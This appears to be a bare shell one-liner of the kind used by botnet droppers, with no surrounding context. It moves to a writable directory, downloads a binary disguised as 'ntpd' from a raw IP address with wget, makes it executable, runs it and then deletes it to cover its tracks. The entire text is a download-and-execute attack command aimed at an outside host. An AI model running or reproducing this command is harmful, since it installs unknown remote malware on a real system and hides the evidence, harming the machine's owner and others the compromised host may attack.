cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.90/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
